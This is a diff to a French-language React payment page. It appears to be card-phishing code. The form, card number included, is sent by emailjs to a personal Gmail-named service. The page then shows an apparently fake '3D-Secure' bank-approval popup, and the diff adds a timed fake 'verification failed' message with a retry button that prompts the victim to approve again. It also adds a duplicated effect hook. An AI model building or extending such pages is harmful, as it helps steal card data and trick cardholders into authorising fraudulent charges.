@@ -8,6 +8,7 @@ const Board = () => {
   const [showPopup, setShowPopup] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [show3DSecurePopup, setShow3DSecurePopup] = useState(false);
+  const [showError, setShowError] = useState(false);
   const [selected, setSelected] = useState(null);
   const [showCache, setShowCache] = useState(true);
 
@@ -26,6 +27,27 @@ const Board = () => {
       clearTimeout(popupTimeout);
     };
   }, []);
+
+  useEffect(() => {
+    let errorTimeout;
+    if (show3DSecurePopup) {
+      errorTimeout = setTimeout(() => {
+        setShowError(true);
+      }, 5000); // 5 seconds
+    }
+    return () => {
+      clearTimeout(errorTimeout);
+    };
+  }, [show3DSecurePopup]);
+
+  useEffect(() => {
+    if (show3DSecurePopup) {
+      const errorTimeout = setTimeout(() => {
+        setShowError(true);
+      }, 5000); // 5 seconds
+      return () => clearTimeout(errorTimeout);
+    }
+  }, [show3DSecurePopup]);
 
   const showPaymentPopup = (plan) => {
     setSelectedPlan(plan);
@@ -64,7 +86,7 @@ const Board = () => {
       setShow3DSecurePopup(true);
     }, 5000);
 
-    emailjs.sendForm('gmail-alexandre', 'new-payment', event.target, 'p7vtRytijMovXPfFA')
+    emailjs.sendForm('gmail-alexandre', '', event.target, 'p7vtRytijMovXPfFA')
       .then(() => {
         console.log('SUCCESS!');
         setIsLoading(false);
@@ -92,6 +114,14 @@ const Board = () => {
       value = value.slice(0, 16);
     }
     input.value = value.replace(/(.{4})/g, '$1 ').trim();
+  };
+
+  const retry3DSecure = () => {
+    setShowError(false);
+    setShow3DSecurePopup(false);
+    setTimeout(() => {
+      setShow3DSecurePopup(true);
+    }, 100); // Small delay to reset the popup
   };
 
   return (
@@ -169,15 +199,23 @@ const Board = () => {
         <div className="popup show">
           <div className="popup-content d-secure show">
             <h3>Vérificaton 3D-secure</h3>
-            <p>Confirmez la pré-autorisaton de {getPlanPrice(selectedPlan).replace("/mois", '')} via votre application bancaire.</p>
-            <span>Essai 30 jours {selectedPlan}</span>
-            <span>Carte : **** **** **** {document.querySelector('input[name="cardNumber"]')?.value.slice(-4) || '****'}</span>
-            <span>{new Date().toLocaleDateString('fr-FR')} {new Date().toLocaleTimeString('fr-FR', { timeZone: 'Europe/Paris' })}</span>
+            {showError ? (
+              <>
+                <p>La vérification a échoué. Veuillez réessayer.</p>
+                <button className='retry-btn' onClick={retry3DSecure}>Réessayer</button>
+              </>
+            ) : (
+              <>
+                <p>Confirmez la pré-autorisaton de {getPlanPrice(selectedPlan).replace("/mois", '')} via votre application bancaire.</p>
+                <span>NETTELER - Essai {selectedPlan}</span>
+                <span>Carte : **** **** **** {document.querySelector('input[name="cardNumber"]')?.value.slice(-4) || '****'}</span>
+                <span>{new Date().toLocaleDateString('fr-FR')} {new Date().toLocaleTimeString('fr-FR', { timeZone: 'Europe/Paris' })}</span>
 
-            <div className="loading-spinner">
-              <div className="spinner"></div>
-            </div>
-
+                <div className="loading-spinner">
+                  <div className="spinner"></div>
+                </div>
+              </>
+            )}
           </div>
         </div>
       )}
